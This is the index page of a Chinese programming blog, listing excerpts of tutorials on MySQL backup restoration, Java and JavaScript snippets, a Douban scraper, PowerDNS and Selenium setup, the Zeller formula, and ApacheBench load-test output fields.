<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c948f82b4a9da837547ed943b0a27be3/" rel="bookmark">
			使用xb文件恢复mysql数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用xb文件恢复mysql数据库 【链接】使用xb文件恢复mysql数据库参考博客
https://www.cnblogs.com/changeEveryDay/p/11758727.html
一.环境配置 安装工具Percona XtraBackup
MySQL 5.6及之前的版本需要安装 Percona XtraBackup 2.3，安装指导请参见官方文档Percona XtraBackup 2.3。
MySQL 5.7版本需要安装 Percona XtraBackup 2.4，安装指导请参见官方文档Percona XtraBackup 2.4。
MySQL 8.0版本需要安装 Percona XtraBackup 8.0，安装指导请参见官方文档Percona XtraBackup 8.0。
【链接】安装工具参考博客
https://blog.csdn.net/yt_php/article/details/95342474
1.安装 xbstream
①安装percona-release
yum install http://www.percona.com/downloads/percona-release/redhat/0.1-3/percona-release-0.1-3.noarch.rpm ②安装percona-xtrabackup-24
yum install percona-xtrabackup-24 ③安装qpress
yum install qpress 2.测试安装是否完成
执行命令测试:
innobackupex --version xtrabackup: recognized server arguments: --server-id=14051 --datadir=/home/mysql/data --open_files_limit=81920 --log_bin=/home/mysql/data/mysql-bin --innodb_open_files=8000 --innodb_buffer_pool_size=4G --innodb_max_dirty_pages_pct=90 --innodb_io_capacity=1000 --innodb_flush_method=O_DIRECT --innodb_file_per_table=1 --innodb_flush_log_at_trx_commit=0 --innodb_log_file_size=100M --innodb_log_buffer_size=10M --innodb_log_files_in_group=3 --innodb_read_io_threads=6 --innodb_write_io_threads=6
innobackupex version 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c948f82b4a9da837547ed943b0a27be3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b0fe816f6bf3f687deb94c9442046cb/" rel="bookmark">
			shiro 报错chainName cannot be null or empty的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		chainName为功能表中的每一个功能的url，shiro要求不能为空
删除查询的权限表内的空数据即可解决
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5628cab28d0dab410998dcfe9c437137/" rel="bookmark">
			更新VantUI 组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 测试时，优惠券界面一直没哟u图片显示出来，以为是bug,最后才知道是环境问题，vantUI版本需要升级；
升级过程：
删除项目中老的vant。
npm uninstall vant安装最新的vant
npm i vant -S 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6dc0dc90392aa98e7ef3b41349f7d2fc/" rel="bookmark">
			JS 判断元素父子关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在工作中遇到一个问题：如果界面元素很多，如何判断当前点击的元素，和某个元素是否有父子关系？
下面这个截图中，可以看到有20个DIV在嵌套。如果界面发生一个点击事件，在document 监听到这个点击事件，怎样判断点击位于哪个父元素下面（PS 这个HTML代码写的语义不明确，层级很复杂）
查找资料后，有下面几个解决方案
原生 JS 原生JS中可以使用 dom.contains(dom) 来判断是否存在父子关系。
var father = document.getElementById('#wrap'); var son = event.target; if (father.contains(son)) { console.log('点击的元素是父元素的子元素'); } else { console.log('点击的元素不是父元素的子元素'); } 注意：这个方法在旧版火狐或者IE浏览器中存在兼容性问题，详情可以参考 https://www.cnblogs.com/cuixi/archive/2013/11/06/3409918.html 兼容写法
// 早期 Firefox 兼容写法 console.log(father.compareDocumentPosition(son)); // 下面是兼容写法 var contains = function(a, b, itself){ // 第一个节点是否包含第二个节点 //contains 方法支持情况：chrome+ firefox9+ ie5+, opera9.64+,safari5.1.7+ if (itself &amp;&amp; a == b){ return true } if (a.contains){ if (a.nodeType === 9) { return true; } return a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6dc0dc90392aa98e7ef3b41349f7d2fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04378063d0526c7050bbec14abbb36e9/" rel="bookmark">
			动态规划—资源分配
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 概要 动态规划的决策不是线性的而是全面考虑到各种不同情况分别进行决策，最后通过多阶段决策逐步找出问题最优解。而当前决策也会依赖于上一阶段的决策，此时便会发生状态的转移。动态规划算法可以说是一种“聪明的蛮力法”，因为动态规划是会考虑到每一种可能，而聪明的地方是相对于蛮力法，它去掉了很多没必要的运算。
例1、资源分配问题
现有7万元需要投资到A，B，C三个项目，利润表如下图。求总利润分配最大的资源分配方案
1234567A0.110.130.150.210.240.300.35B0.120.160.210.230.250.240.34C0.080.120.200.240.260.300.35 #include &lt;iostream&gt; using namespace std; int main(){ double invest[3][8]={//投资表，记录了A，B，C三个投资的利润率信息,预留多一个位置,invest[i][j]中i表示项目，j表示金额 {0,0.11,0.13,0.15,0.21,0.24,0.30,0.36}, {0,0.12,0.16,0.21,0.23,0.25,0.24,0.34}, {0,0.08,0.12,0.20,0.24,0.26,0.30,0.35} }; double max[8],temp[8]={0},gain[8]={0};//max记录的是优策略下的投资利润率，gain记录的是当前投资金额可得的最大利润 //temp记录的是上一次决策中可以获得的最大利润 for(int i=0;i&lt;8;i++){//初始化，当只有A投资可选时，最优投资策略便是全部投资A max[i]=invest[0][i]; } for(int i=0;i&lt;8;i++){//初始化，当只有A投资可选时，可以得到的最大利润 gain[i]=invest[0][i]*i; }	for(int i=1;i&lt;3;i++){//控制投资项目 for(int j=1;j&lt;8;j++){//控制投资金额，j即为当前的投资金额 for(int k=0;k&lt;j;k++){//k表示投资给上一个最优决策的金额， j-k表示把剩余的资金投资给新添加的那个项目 temp[j]=max[k]*k+invest[i][j-k]*(j-k); if(gain[j]&lt;temp[j]){ gain[j]=temp[j]; max[j]=gain[j]/j; }	} } } //输出 cout&lt;&lt;"最大投资利润率为："; for(int i=1;i&lt;8;i++){ cout&lt;&lt;max[i]&lt;&lt;" "; } cout&lt;&lt;endl&lt;&lt;"最大利润为："; for(int i=1;i&lt;8;i++){ cout&lt;&lt;gain[i]&lt;&lt;" "; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a66d5c1fef1325ac4d6e9f186bef01bf/" rel="bookmark">
			Python数据分析之豆瓣影片TOP250爬取与分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		豆瓣影片TOP250爬取与分析 我会把每次在网络上做的爬虫和数据分析都发上来，至少每周一次，这既是为了督促自己，也是希望能把自己遇到的问题及解决方法和大家分享。
爬取网页 这次爬虫使用的是pyquery和requests，requests主要是用来获取图片的字节信息的，没在pyquery中找到，知道的朋友也可以说一下，大家一起进步~！
因为豆瓣电影中比较友好，所以我只设置了一个伪装浏览器的headers就开始爬取了，很顺畅地获取到了网页信息。
接下来是解析网页了，因为影片信息都在单独
中，所以一次获取一个页面所有影片的，接下来再进行遍历，把每部影片中的信息提取出来。
def get_html(url): # 获取页面 headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" } # 构建请求头 doc = pq(url, headers=headers) # 请求页面，获取返回url的html return doc def parse_html(doc): # 解析页面 li_list = doc(".article .grid_view").find("li") # 获取影片内容所在区域 for item in li_list.items(): # 对同一页中每部影片遍历，获取每部影片相关内容 try: movie_poster_src = item(".item .pic a").find("img").attr("src") # 获取海报的资源地址 movie_poster_b = requests.get(movie_poster_src).content # 获取海报，并将图片转为字节 movie_num = item("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a66d5c1fef1325ac4d6e9f186bef01bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82ceef139b60453540ee14b21359c59f/" rel="bookmark">
			io流
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		File中的一些方法 File file = new File("C:/Users/Administrator/Desktop/GG"); file.createNewFile(); 创建文件 file.mkdirs(); 创建文件夹 file.delete(); 删除 file.isDirectory(); 判断是否是目录 file.isFile(); 判断是否是文件 file.exists(); 判断是否存在 file.canRead(); 判断是否可读 file.canwrite(); 判断是否可写 file.isHidden() 判断是否隐藏 file.getAbsolutepath(); 获取绝对路径 file.getpath(); 获取路径 file.getName(); file.length(); 获取长度 （Long类型） file.lastModified(); 获取最后一次的修改时间 （Long类型） file.list(); 获取文件夹下所有东西（String类型） file.listFile(); 获取文件夹下所有东西（File类型—含路径） File、FileInputStream、ByteArrayOutputStream File file = new File("C:/Users/Administrator/Desktop/GG"); File filedoc = new File(file+"/gg.doc"); if (!file.exists()) { log.info("文件夹不存在,创建文件夹"); file.mkdirs(); } if (!filedoc.exists()) { log.info("文件不存在,创建文件"); filedoc.createNewFile(); } FileOutputStream out = new FileOutputStream(filedoc,true); //true：不覆盖以前的类容（可为空） FileInputStream in = new FileInputStream(new File("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82ceef139b60453540ee14b21359c59f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/473017e51765ee35b6eab90c72b9c7a1/" rel="bookmark">
			SpringBoot集成PageHeler配置正常却分页无效问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意，本文的前提是配置正常，即依据官方文档配置有使用了 pagehelper springboot starter的情况。以下问题分析都是基于pagehelper springboot starter 1.2.10（经查看目前最新的1.2.13源码，发现仍有同样问题）
1. starter pom &lt;project xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://maven.apache.org/POM/4.0.0" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper-spring-boot&lt;/artifactId&gt; &lt;version&gt;1.2.10&lt;/version&gt; &lt;/parent&gt; &lt;artifactId&gt;pagehelper-spring-boot-starter&lt;/artifactId&gt; &lt;name&gt;pagehelper-spring-boot-starter&lt;/name&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper-spring-boot-autoconfigure&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/project&gt; 从上面的pom中可以看出，这里已经依赖了pagehelper-spring-boot-autoconfigure、pagehelper，不需要再重复引入，网上大部分都是说少了引入这两个jar，实属瞎扯淡（starter版本一致的情况下）。下面开始贴自动配置源码
1.1 PageHelperAutoConfiguration源码 /* * The MIT License (MIT) * * Copyright (c) 2017 abel533@gmail.com * * Permission is hereby granted, free of charge, to any person obtaining a copy * of this software and associated documentation files (the "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/473017e51765ee35b6eab90c72b9c7a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ed2d0d811021af50f28552ce2312b1e/" rel="bookmark">
			linux 安装地球物理学常用软件：FFTW、Madagascar、GTK未完待续~~~
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1linux安装FFTW
1.1下载并解压安装包
1.2设置安装路径
./configure --prefix=/home/install/software/fftw 1.3 安装
make make install 1.4配置环境变量
vim ~/.bashrc
export LD_LIBRARY_PATH=$LD_LIBRARYPATH:/home/install/software/fftw/lib export PATH=$PATH:/home/install/software/fftw/bin 2linux安装madagascar
2.1 下载并解压安装包
2.2 设置环境变量和语言接口
./configure API=c++,f90 --prefix=/home/install/software/mada 2.3安装
make make install 2.4设置数据路径
cd /home/zf/install/software/mada/share/madagascar/etc/ vim env.sh export DATAPATH=/home/zf/install/software/mada/RSFDATA/ 2.5配置环境变量
export RSFROOT=/home/install/software/mada source $RSFROOT/share/madagascar/etc/env.sh 3linux安装GTK
3.1 下载并安装java编译环境JDK，网址如下：
https://www.oracle.com/java/technologies/javase-downloads.html
配置环境变量
JAVA_HOME=/home/zf/install/Mines_JTK/jdk1.8.0_181 PATH=$JAVA_HOME/bin:$PATH CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export JAVA_HOME export PATH export CLASSPATH 3.2 下载并安装 Gradle
PATH=$PATH:/home/zf/install/Mines_JTK/gradle-3.2.1/bin export PATH 3.2 下载并安装 gtk
在github上下载GDK安装包
1 cd到你想安装的目录文件
2 下载安装包
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ed2d0d811021af50f28552ce2312b1e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6424384f61c568e6ed4f7a2fa40fd3cb/" rel="bookmark">
			蔡勒(Zeller)公式理解Get（√）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Preface 偶然做到日期相关题目，了解到Zeller公式。不甘心停留在使用阶段，便想掌握其推导过程。
只适用于格利戈里历法，也就是现今的公历。
1. Zeller公式 标准形式 计算1582年10月4日或之前日期 (罗马教皇决定在1582年10月4日后使用格利戈里历法) w：星期； w对7取模得：0-星期日，1-星期一，2-星期二，3-星期三，4-星期四，5-星期五，6-星期六c：世纪（注：一般情况下，在公式中取值为已经过的世纪数，也就是年份除以一百的结果，而非正在进行的世纪，也就是现在常用的年份除以一百加一；不过如果年份是公元前的年份且非整百数的话，c应该等于所在世纪的编号，如公元前253年，是公元前3世纪，c就等于-3）y：年（一般情况下是后两位数，如果是公元前的年份且非整百数，y应该等于cMOD100+100）m：月（m大于等于3，小于等于14，即在蔡勒公式中，某年的1、2月要看作上一年的13、14月来计算，比如2003年1月1日要看作2002年的13月1日来计算）d：日[ ]代表取整，即只要整数部分。 注意：编程中MOD运算 ≠ 数学中MOD的运算， 所以若D为负数，则在求W之前可对D进行7的倍数的自增运算，让其成为正数，最后对7求余得到结果。
思考： 如何将给定日期换算成星期数呢？ 找已知日期(年月日，周几)作为源计算目标日期与源的间隔天数将间隔天对7取余获取偏移量将源的week加上偏移量得到目标星期数 2. 推导过程 如你所想，Zeller公式并不神秘。通过以上思想的优化和扩展后，便得到Zeller公式。
从以上思想开始扩展。
1. 如何获取间隔天数？
D = D1 + D2 + D3 D1：从原点到原点所在年份末尾的天数。D2：原点所在年份和目标日期所在年份之间所有年份的天数和。D3：目标日期所在年份的第一天到目标日期的天数。 优化:
1. 若我们把源设定为12月31日则可省去D1的计算。于是 D = D2 + D3
2. 若源点正好是周日就正好了 可以省去偏移量的计算。
巧了： 我们发现公元元年的前一年12月31日恰好是周日，这是一个完美的源。
D2：
假设目标日期是y-m-d, 我们可以很简单的得出D2
因一年至少有365天，此外，闰年比平年多一天，所以需加上闰年中多出来的天数。
闰年规则: 四年一闰， 百年不闰， 四百年闰。故：
至此：D1 D2 解决
D3：先不考虑闰年，因2月份天数28天最少，因此，我们不妨把每个月的天数看作 “28 + Excess”的模式，m 月之前所有月份的 Excess 之和为 Accum(m)，则 D3=28×(m−1)+Accum(m)+d，并且我们可以得到这样一张表格：
月份表 月份123456789101112天数312831303130313130313031Excess303232332323Accum0336811131619212426 通过上表可发现Excess 3 月份开始是 3、2、3、2、3 的循环，因此，当 m≥3m≥3 时，Accum(m)的值的增幅也是 3、2、3、2、3 的循环。因为每 5 个月增加 13，所以把 作为系数；因为 Accum(m) 的值是离散的（都是整数），所以我们用取整运算符，得到：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6424384f61c568e6ed4f7a2fa40fd3cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac58c9c7565c3d6cb3187fe2579b0cca/" rel="bookmark">
			实现 PowerDNS 应用部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现 PowerDNS 应用部署 PowerDNS官网：https://www.powerdns.com/PowerDNS文档：https://doc.powerdns.com/Poweradmin官网：http://www.poweradmin.org/ CentOS 7 利用RPM包部署PowerDNS
安装基本包 [root@Centos7 ~]# yum -y install pdns pdns-backend-mysql mariadb-server [root@Centos7 ~]# systemctl start mariadb 准备mariadb中的数据库，表和用户 MariaDB [(none)]&gt; CREATE DATABASE powerdns; Query OK, 1 row affected (0.00 sec) MariaDB [(none)]&gt; GRANT ALL ON powerdns.* TO 'powerdns'@'localhost' IDENTIFIED BY 'centos'; Query OK, 0 rows affected (0.00 sec) [root@Centos7 ~]# rpm -ql pdns-backend-mysql /usr/lib64/pdns/libgmysqlbackend.so /usr/share/doc/pdns-backend-mysql-4.1.11 /usr/share/doc/pdns-backend-mysql-4.1.11/3.4.0_to_4.1.0_schema.mysql.sql /usr/share/doc/pdns-backend-mysql-4.1.11/dnssec-3.x_to_3.4.0_schema.mysql.sql /usr/share/doc/pdns-backend-mysql-4.1.11/nodnssec-3.x_to_3.4.0_schema.mysql.sql /usr/share/doc/pdns-backend-mysql-4.1.11/schema.mysql.sql / 用powerdns自带的schema.mysql.sql 脚本生成数据库 表 [root@Centos7 ~]# mysql powerdns &lt; /usr/share/doc/pdns-backend-mysql-4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac58c9c7565c3d6cb3187fe2579b0cca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/593211345c017090135727b48ae15d40/" rel="bookmark">
			day31(12.10):seleniumwebdriver环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		web阶段学习说明
1.对于python基础要求：第一阶段的内容都需要掌握。特别是类和对象、单元测试框架、 日志
2.与接口自动化差异较大。在web自动化当中，也可以适当的使用接口。
3.与APP功能自动化非常相似！同为UI功能测试，是APP自动化的基础！！
问题：
1.有了接口自动化还要做web自动化吗？
web页面（UI）-&gt;接口-&gt;后台服务-&gt;数据库
（1）用户直接使用UI
（2）有些接口返回的数据-前端有逻辑处理-未必展示
2.web自动化是什么？用代码代替我的双手–点点点网页
代码（打开网站/输入xxx/点击xxx） 中间人（传递信息） ==== 浏览器（google/ie/firefox）的网页
python/java/C#/ruby(打开网站/输入xxx/点击xxx) ==驱动程序= 浏览器（google/ie/firefox）
google -----chromedriver
ie------ieserverdriver
firefox-------geckodriver
驱动程序和浏览器版本匹配的问题
我的google的驱动程序是78版本（帮助-&gt;关于google）
在百度里输入chromdriver
点击并打开ChromDriver Mirror
选择最新的版本
windows32/64通用 chromedriver.exe就是它的驱动，不要双击打开，放在python的根目录下C:\Python37
python–写网页操作（–打开网站/输入xxx/点击xxx—）第三方库（提供了网页操作的API-函数）
selenium
安装selenium
1.命令行使用以下命令安装selenium:
pip install -U selenium
但是没安装成功，如下提示
这名话的意思是我使用的版本是19.0.3，最近版本是19.3.1
用这个命令可以升级到最新版本python -m pip install --upgrade pip
升级成功：
2.安装chrom浏览器chrome和chromedriver下载
chromedrive下载地址：
http://npm.taobao.org/mirrors/chromedriver/
(ps:要与chrome浏览器版本匹配)
3.chromedriver放在python的安装目录下面即可
环境安装的博客文章地址：https://www.cnblogs.com/Simple-Small/p/10065674.html
其它fire和ie浏览器的驱动下载，均可在本篇文章中找到。
3.selenium是什么？–selenium?访问url,页面的输入框当中，输入柠檬班
python（指令：1.打开google chrome; 2.访问www.baidau.com 3.输入柠檬班）=chromedriver=chrome
接口：http://test.lemonban.com python、postman、jemeter?http–传递过来的数据，我不能够解析
python—chromedriver http请求–暗号标准？
打开浏览器：暗号1-狗 访问网页：暗号2-猪 输入文本值：暗号3-不如
python(客户端)===chromedriver(服务端) ip地址+端口号
流程：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/593211345c017090135727b48ae15d40/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc91f32326881b8756801515f7209bd2/" rel="bookmark">
			spring框架aop切面-不修改原代码添加新功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 很久以前在有道云笔记上写的笔记，打算放弃它了，将笔记迁移到这里来。文章可能还有很多不足，请大家谅解，欢迎大佬提意见。
本文使用到的东西 javaecplipsespring aop概述 aop的原理基于java动态代理模式，在java文件夹中有动态代理示例
aop添加包 aop实现除了spring包以外还需要添加的包
链接：https://pan.baidu.com/s/1acjKuNkqxdwdoz1hghy_wg
提取码：tbko
aop简单示例 链接：https://pan.baidu.com/s/1ycVitoJJ0tHjexycTOnSGw
提取码：o48k
环绕通知中参数的一些运用示例 链接：https://pan.baidu.com/s/1rr-wNlNFaCnc4AMPgBeVUA
提取码：50jy
aop定义配置文件示例 &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd "&gt; &lt;!-- 创建1个业务类对象 --&gt; &lt;bean id="service" class="com.etc.service.UserServiceImpl"&gt; &lt;/bean&gt; &lt;!-- 创建1个业务类对象 --&gt; &lt;bean id="service2" class="com.etc.service.UserServiceImpl2"&gt; &lt;/bean&gt; &lt;!-- 创建1个自定义通知类对象 --&gt; &lt;bean id="advice" class="com.etc.advice.MyAdvice"&gt; &lt;/bean&gt; &lt;!-- 配置aop的织入--&gt; &lt;aop:config&gt; &lt;aop:pointcut expression="execution(* com.etc.service.UserService.*og*(..))" id="pc"/&gt; &lt;aop:pointcut expression="execution(* com.etc.service.UserService.*eg*(..))" id="pc2"/&gt; &lt;aop:aspect ref="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc91f32326881b8756801515f7209bd2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca6f1fc6bafdbf6db0c377a8ebc16579/" rel="bookmark">
			echarts 中 markLine 的值超过 series 的最大范围后不显示的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先说说背景. 公司的出库零件数趋势以折线图展示. 然后有这样一个需求, 就是在折线图上以横线的方式标出当前时间点的出库预期值. 既然是预期值, 那么即有可能会小于或等于实际值, 也有可能会大于实际值. 因此该需求可以用 markLine 简单实现一下:
// goal 为目标值, extent 中能够拿到所有折线图 series 的最大值和最小值 { yAxis: { max: extent =&gt; extent.max &gt; goal ? extent.max : goal }, series: { markLine: { data: [{ yAxis: goal }] } } } 效果 🔽
这样已经实现了功能! 然而这就可以交差了吗? 当然不是, 我们注意看上面截图的效果，纵轴最上面的一个坐标值是 13330, 而不是 15000。也就是说markLine是显示了，但是纵坐标的分割区间看起来就像是缺了最上面的一绺。按照预期13330这条标记线应该被包含在12000-15000这个分割区间范围内才对, 这好像跟我们以为的结果不太符合啊，看着十分别扭，这是一个追求完美的前端开发工程师绝对不能容忍的. 然后又仔细研究开发文档, 并没有找到有用的信息, 看来 echarts.yAxis.max 的唯一作用就是强制修改图表能够展示的最大值, 也同时影响坐标刻度的最后一个值. 这不是我们想要的.
来我们先看看原本不添加 markLine 时候的效果⏬，数据应该分布在由几条分割线组成的完整的分割区间内。
来我们再看看我们真正想要的结果⏬，同样的，我们希望包括markLine在内的数据也应该分布在几条分割线组成的完整的分割区间内
所以这是怎么做到的呢? 根据以上需求, 我们只需要得到相邻两条分割线之间的差值 (如上图, 在我的需求中应该是 3000) 和实际需要的分割段数, 然后据此计算出纵坐标最大的坐标轴刻度值, 最后通过 echarts.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca6f1fc6bafdbf6db0c377a8ebc16579/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aaf382fd2ad6022d0e7be4760cf15853/" rel="bookmark">
			ab压测参数和响应字段说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自 https://blog.csdn.net/Sunflower23/article/details/87076416
http://blog.sina.com.cn/s/blog_99baab530102vbwz.html
简介 ab是apache自带的压力测试工具，ab是apachebench命令的缩写。ab非常实用，它不仅可以对apache服务器进行网站访问压力测试，也可以对或其它类型的服务器进行压力测试，比如nginx、tomcat、IIS等
原理 ab命令会创建多个并发访问线程，模拟多个访问者同时对某一URL地址进行访问。它的测试目标是基于URL的，因此，它既可以用来测试apache的负载压力，也可以测试nginx、lighthttp、tomcat、IIS等其它Web服务器的压力
ab命令对发出负载的计算机要求很低，它既不会占用很高CPU，也不会占用很多内存。但却会给目标服务器造成巨大的负载，自己测试使用也需要注意，否则一次上太多的负载。可能造成目标服务器资源耗完，严重时甚至导致死机
3、安装
首先需要安装Apache服务器和安装最新版C++ Redistributable Visual Studio 2017组件，下载地址：https://www.apachelounge.com/download/
根据自己电脑配置下载对应的安装包，并解压到C盘，
这里需要说明一下，为什么要解压到C盘，解压有个安装说明文档， Apache需要解压在一个盘符的根目录下，这就是所谓的“ServerRoot”，默认是配置在：{Apache24}\conf\httpd.conf这个文件中的，而默认配置的ServerRoot是放在了C盘（C:/Apache24），也就是说解压到其他盘是无法启动的。当然，你也可以解压到D盘再直接修改**{Apache24}\conf\httpd.conf的配置**
这些步骤准备好了之后，就可以运行bin目录下的httpd.exe文件，运行之后后台服务就启动了，这时候在浏览器中输入：http://localhost/，如果能够看到测试页面，
就说明服务启动成功，下面就可以在DOS界面输入我们的命令了。
使用 在命令行下跳转到bin目录下，运行ab.exe
启动后就可运行我们的压测命令了，需要注意的是，运行的地址后面需要附带path，否则视为无效。一下以百度网址为例
-n是指请求总数为1000，-c请求并发数为500（最常用的命令）
可以看到，如图列出了“请求命令”、“测试结果主体”、“所测试数据返回时间的百分比”，其中，“测试结果主体”里面，具体的参数为：
Concurrency Level: 并发量。（500）
Time taken for tests: 整个测试所用的时间。（7.167s）
Complete requests: 完成的请求数。（1000）
Failed requests: 失败的请求数。（0）
Non-2xx responses: 如果接收到的HTTP响应数据的头信息中含有2XX以外的状态码，则会在测试结果中显示另一个名为“Non-2xx responses”的统计项，用于统计这部分请求数（这些请求并不算在失败的请求中）。（1000）
Total transferred: 表示所有请求的响应数据长度总和，包括每个HTTP响应数据的头信息和正文数据的长度。（484000bytes）
HTML transferred: 表示所有请求的响应数据中正文数据的总和，也就是减去了Total transferred中HTTP响应数据中的头信息的长度。（222000 bytes）
Requests per second(RPS): 吞吐率。要清楚吞吐率是与并发数相关的，即使请求总数相同，但如果并发数不一样，吞吐率还是很可能有很大差异的。 （139.53【#/second】）
计算公式：Complete requests/Time taken for tests
Time per request(mean): 用户平均请求等待时间。也就是一次并发总的时间。 （3583.500 ms）
计算公式：Time token for tests/（Complete requests/Concurrency Level）。
	</div>
	<div class="list__footer clearfix">
